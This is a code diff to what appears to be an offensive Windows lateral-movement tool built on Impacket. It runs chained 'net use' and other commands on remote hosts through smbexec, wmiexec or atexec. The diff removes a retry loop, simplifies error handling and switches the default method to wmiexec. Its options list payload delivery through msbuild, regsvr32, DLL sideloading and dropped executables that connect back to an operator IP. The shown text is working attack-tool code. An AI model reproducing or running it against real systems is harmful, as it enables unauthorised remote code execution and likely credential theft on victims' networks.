@@ -200,39 +200,29 @@ class SMBEXECShell():
 
         # We don't wanna deal with timeouts from now on.
         s.setTimeout(100000)
-        errorfound = 'STATUS_OBJECT_NAME_NOT_FOUND'
-        while errorfound == 'STATUS_OBJECT_NAME_NOT_FOUND': # fix to repeat when we get objectnamenotfounderror
-            try:
-                self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
-                resp = scmr.hROpenSCManagerW(self.__scmr)
-                self.__scHandle = resp['lpScHandle']
-                self.transferClient = rpc.get_smb_connection()
-                self.do_cd('', addr)
-                if command2run == 'wmic logicaldisk get caption ':  # so auto drive can work since it does not conatin any & symbols
-                    self.send_data(command2run, addr)
-                else:
+        try:
+            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
+            resp = scmr.hROpenSCManagerW(self.__scmr)
+            self.__scHandle = resp['lpScHandle']
+            self.transferClient = rpc.get_smb_connection()
+            self.do_cd('', addr)
+            if command2run == 'wmic logicaldisk get caption ':  # so auto drive can work since it does not conatin any & symbols
+                self.send_data(command2run, addr)
+            else:
+                tmphold = self.send_data(command2run[:command2run.find('&')], addr)
+                if (tmphold.find('The command completed successfully') != -1 and tmphold.find('System error 85 has occurred') == -1):  # SMBEXEC dummy and cant accept && so we must ensure that the net use command worked so we dont delete client shares ##
+                    command2run = command2run[command2run.find('&&') + 3:]
                     tmphold = self.send_data(command2run[:command2run.find('&')], addr)
-                    if (tmphold.find('The command completed successfully') != -1 and tmphold.find('System error 85 has occurred') == -1):  # SMBEXEC dummy and cant accept && so we must ensure that the net use command worked so we dont delete client shares ##
-                        command2run = command2run[command2run.find('&&') + 3:]
-                        tmphold = self.send_data(command2run[:command2run.find('&')], addr)
-                        command2run = command2run[command2run.find('&&') + 3:]
-                        tmphold = self.send_data(command2run[:command2run.find('&')], addr)
-                    else:
-                        printnlog('{}: {}'.format(addr, tmphold))
-
-                errorfound = ''
-
-            except BaseException as e:
-                if str(e).lower().find('dce') != -1:
-                    errorfound = ''
-                    printnlog('DCE RPC Error')
-                elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
-                    printnlog('{}: STATUS_OBJECT_NAME_NOT_FOUND'.format(addr))
-                    errorfound = 'STATUS_OBJECT_NAME_NOT_FOUND'
-                    continue
+                    command2run = command2run[command2run.find('&&') + 3:]
+                    tmphold = self.send_data(command2run[:command2run.find('&')], addr)
                 else:
-                    printnlog('Error in here: {}'.format(str(e)))
-                    errorfound = ''
+                    printnlog('{}: {}'.format(addr, tmphold))
+
+        except BaseException as e:
+            if str(e).lower().find('dce') != -1:
+                printnlog('DCE RPC Error')
+            else:
+                printnlog('Error in here: {}'.format(str(e)))
 
 
     def finish(self):
@@ -2421,7 +2411,7 @@ if __name__ == '__main__':
     parser.add_argument('-drive', action='store', help='Set the drive letter for the remote device to connect with')
     parser.add_argument('-threads', action='store', type=int, default=5, help='Set the maximum number of threads default=5')
     parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
-    parser.add_argument('-method', action='store', default='smbexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
+    parser.add_argument('-method', action='store', default='wmiexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
     parser.add_argument('-payload', '-p', action='store', default='exe-mdwdpss', choices=['msbuild', 'regsvr32-mdwdpss', 'regsvr32-mdwd', 'dllsideload-mdwdpss', 'dllsideload-mdwd', 'exe-mdwdpss', 'exe-mdwd', 'exe-rtlcp'], help='Choose a payload type')
     parser.add_argument('-payloadname', action='store', help='Set the name for the payload file Default=random')
     parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
